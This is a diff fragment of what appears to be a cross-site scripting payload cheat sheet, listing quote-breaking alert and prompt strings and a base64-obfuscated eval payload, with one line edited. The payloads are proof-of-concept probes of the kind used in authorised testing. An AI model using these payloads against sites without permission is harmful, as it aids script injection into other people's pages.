@@ -62,7 +62,7 @@ Injecting anchor tag without whitespaces -breaking up characters with decoded va
  '-alert(1)-' (if backslash escaped use the payload below) <br> 
 \'-alert(1)// <br>
 "+alert(1));<!-- <br>
-'-prompt(1)// <br>
+('-prompt(1)//) <br>
 // generate string for this payload with btoa('alert(1)') <br>
 eval(atob('YWxlcnQoMSk=')) <br>
 \'-prompt(1)// <br>
